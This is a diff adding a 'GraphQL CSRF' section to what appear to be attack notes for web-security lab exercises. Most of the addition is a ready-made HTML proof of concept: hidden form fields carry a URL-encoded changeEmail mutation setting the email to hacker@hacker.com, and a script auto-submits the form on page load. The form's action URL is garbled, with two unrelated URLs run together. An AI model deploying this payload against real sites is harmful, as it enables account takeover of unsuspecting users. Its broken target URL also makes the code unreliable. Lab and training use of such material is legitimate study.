@@ -245,7 +245,24 @@ query login($input:String){
 }
 ```
 
+## 5. GraphQL CSRF
+If endpoint do not validate content type of received requests and no CSRF tokens implemented
 
+POST - application/json => secure vs forgery; content is validated
+GET or others - x-www-form-urlencoded
+
+```
+<html>
+	<body>
+		<form method="POST" action="http://owaspbwa/ghost/blogView.phphttps://0a100042040fa701801a030a00ff007d.web-security-academy.net/graphql/v1">
+			<input type="hidden" name="query" value="%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A"/>
+			<input type="hidden" name="operationName" value="changeEmail"/>
+			<input type="hidden" name="variables" value="%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D">
+		</form>
+<script>document.forms[0].submit()</script>
+	</body>
+<html>
+```
 
 
 
